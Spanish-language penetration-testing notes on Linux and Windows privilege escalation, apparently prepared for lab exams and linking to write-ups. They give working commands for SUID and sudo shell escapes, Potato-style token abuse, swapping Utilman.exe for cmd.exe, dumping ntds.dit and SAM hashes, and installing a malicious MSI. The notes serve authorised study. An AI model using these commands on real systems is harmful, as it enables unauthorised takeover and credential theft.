# 5. Escalada de Privilegios (Linux & Windows)

Tras conseguir shell: estabiliza TTY, **captura `local.txt`**, y lo PRIMERO es `sudo -l` (Linux) / `whoami /priv` (Windows).

## Scripts automatizados
- **Linux:** LinPEAS → `./linpeas.sh | tee linpeas.out`
- **Windows:** WinPEAS → `winPEASany.exe`
- **Linux (procesos):** `pspy64` para ver cron/tareas en tiempo real

---

## LINUX

### Comprobaciones manuales rápidas
```bash
id; sudo -l                          # ¡SIEMPRE primero!
uname -a; cat /etc/os-release        # kernel (última opción)
find / -perm -4000 -type f 2>/dev/null   # binarios SUID
getcap -r / 2>/dev/null              # capabilities
crontab -l; cat /etc/crontab; ls -la /etc/cron.*   # cron
ps aux                               # procesos como root
cat /etc/passwd
find / -name "*.txt" 2>/dev/null; cat ~/.bash_history
netstat -tulnp                       # servicios internos → pivoting
```

### Vectores clásicos
- **`sudo -l` con NOPASSWD** → busca el binario en **GTFOBins** para escapar a root.
- **SUID inusual** → GTFOBins. 🔴 **Un intérprete con SUID** (`php`, `python`, `perl`, `ruby`, `bash`, `nmap`…) en la lista de SUID = root casi seguro: no es SUID por defecto en ninguna instalación limpia. Salta directo a GTFOBins con el filtro SUID. Ejemplo (Astronaut, [`writeups/astronaut-grav-writeup.md`](writeups/astronaut-grav-writeup.md)): `/usr/bin/php7.4 -r "pcntl_exec('/bin/sh', ['-p']);"` — el `-p` conserva `euid=0`, y `euid=0` ya es root efectivo aunque `uid` siga siendo bajo (lees `/root`).
- **Capability** `cap_setuid`, etc. → GTFOBins.
- **Cron** editable o con wildcard/PATH manipulable.
- **Credenciales** en configs, `.bash_history`, `/var/www`, DBs, `.ssh`.
- **Reutilización de contraseñas** (misma pass de la web → SSH root).
- **Kernel exploit** (PwnKit/CVE-2021-4034, DirtyPipe) → **último recurso**, verifica versión exacta.

```bash
# Ejemplo GTFOBins: sudo find
sudo find . -exec /bin/sh \; -quit
```

---

## WINDOWS

### Comprobaciones manuales rápidas
```cmd
whoami /priv                 :: ¡privilegios! busca SeImpersonate / SeAssignPrimaryToken
whoami /groups
systeminfo                   :: hotfixes y versión de OS
net user & net localgroup administrators
cmdkey /list                 :: credenciales guardadas
wmic service get name,displayname,pathname,startmode
```
```cmd
:: AlwaysInstallElevated
reg query HKLM\Software\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
reg query HKCU\Software\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
```

### Vectores clásicos
- **SeImpersonatePrivilege** (cuentas de servicio, IIS, MSSQL) → **PrintSpoofer** o **GodPotato**:
  ```cmd
  PrintSpoofer.exe -i -c cmd
  GodPotato.exe -cmd "cmd /c whoami"
  ```
- **SeRestorePrivilege** (poder escribir CUALQUIER archivo, saltándose ACLs) → **SYSTEM** sobrescribiendo un binario que corre como SYSTEM. Clásico: cambiar `Utilman.exe` (o `sethc.exe`) por `cmd.exe` y dispararlo en la pantalla de login (RDP con NLA off → botón de Accesibilidad = consola SYSTEM). Writeup completo: [`writeups/heist-writeup.md`](writeups/heist-writeup.md).
  ```cmd
  :: Desde Kali, tras hacer el swap:
  xfreerdp /v:<IP> /cert:ignore /sec:nla:off   :: -> Ease of Access -> cmd como SYSTEM
  ```
  > 🔴 El privilegio **no basta con estar "Enabled"**: el fichero debe abrirse en **modo backup** (`FILE_FLAG_BACKUP_SEMANTICS`). `copy`/`Copy-Item` normales dan `Access Denied`; `robocopy /B` exige SeBackup **y** SeRestore. Con solo SeRestore, abre el fichero tú mismo vía `CreateFile` desde PowerShell (bloque en el writeup de Heist). Activar el privilegio y escribir deben ocurrir en el **mismo proceso**.
- **SeBackupPrivilege** (leer CUALQUIER archivo en modo backup) → copiar `C:\Windows\NTDS\ntds.dit` + el hive `SYSTEM` con `robocopy /B`, o volcar SAM/SYSTEM → `secretsdump` offline. En un DC = todos los hashes del dominio.
- **Unquoted service path** con espacios y carpeta escribible → colocar binario malicioso.
- **Permisos débiles en el binario/servicio** → reemplazarlo y reiniciar el servicio.
- **AlwaysInstallElevated** (ambas claves = 1) → instalar `.msi` malicioso:
  ```cmd
  msiexec /quiet /qn /i evil.msi
  ```
- **Credenciales** en registro, `unattend.xml`, `web.config`, scripts.
- **Kernel exploit** según `systeminfo` → último recurso (usa Windows Exploit Suggester).
